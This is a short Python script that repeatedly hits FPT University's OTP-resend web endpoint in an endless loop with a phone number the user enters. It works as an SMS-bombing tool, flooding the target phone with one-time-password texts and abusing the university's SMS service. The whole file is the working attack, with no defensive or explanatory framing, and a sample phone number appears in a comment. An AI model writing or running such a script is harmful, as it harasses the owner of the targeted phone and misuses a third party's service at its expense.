#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def fpt(phone): #phone = 0943687522
	link = "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile={0}".format(phone)
	data = requests.get(link)
	return(data)

phone = input(">_ Phone : ")
count = 0
while True:
	count = count + 1
	print(count,fpt(phone))

